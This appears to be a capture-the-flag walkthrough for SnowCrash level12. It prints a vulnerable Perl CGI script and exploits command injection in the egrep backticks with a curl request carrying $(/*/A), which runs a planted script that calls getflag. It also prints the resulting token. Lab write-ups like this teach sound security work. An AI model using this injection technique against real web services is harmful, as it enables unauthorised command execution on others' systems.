
# SnowCrash Level12 Walkthrough

This walkthrough explains how we exploited a Perl web service vulnerability to execute arbitrary commands and retrieve the flag for `level12`.

---

## 🧭 Step 1: Exploring the Environment

We start by listing the home directory:

```bash
level12@SnowCrash:~$ ls
level12.pl
```

We find a Perl script named `level12.pl`.

---

## 📖 Step 2: Understanding the Perl Script

We read the file:

```bash
level12@SnowCrash:~$ cat level12.pl
```

It contains:

```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```

### 🔍 Explanation:

- The script runs a web server on `localhost:4646`.
- It uses `CGI` to receive two parameters: `x` and `y`.
- It transforms `x` to uppercase and removes whitespace and everything after it.
- Then, it runs a command: `` `egrep "^$xx" /tmp/xd` ``, which is vulnerable to command injection.

**Key Vulnerability**: The user-controlled input `x` is directly interpolated into a shell command — this allows **command injection**.

---

## ⚙️ Step 3: Prepare a Malicious Script

We create a file that executes the `getflag` command:

```bash
echo "getflag > /tmp/test" > /tmp/A
```

✅ We redirect the output of `getflag` into a file called `/tmp/test`.

Next, we make the file executable:

```bash
chmod +x /tmp/A
```

---

## 🚀 Step 4: Trigger the Exploit via Curl

Now we use `curl` to send a malicious `x` parameter to the Perl server:

```bash
level12@SnowCrash:~$ curl 'localhost:4646/?x=$(/*/A)'
```

### 🔍 Explanation:

- `$(/*/A)` expands to `/tmp/A`, and executes it in a shell.
- Since the script uses backticks (`` `egrep "^$xx" /tmp/xd` ``), our command gets executed.
- This runs `getflag > /tmp/test` on the server.

---

## 📄 Step 5: Read the Flag Output

We verify the result:

```bash
level12@SnowCrash:~$ cat /tmp/test
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

Success!

---

## ✅ Summary

- Found a Perl script vulnerable to command injection through user input.
- Injected a shell command via a specially crafted `curl` request.
- Retrieved the flag from a temporary file written by our malicious script.

---

### 🎯 **Flag:** `g1qKMiRpXf53AWhDaU7FEkczr`
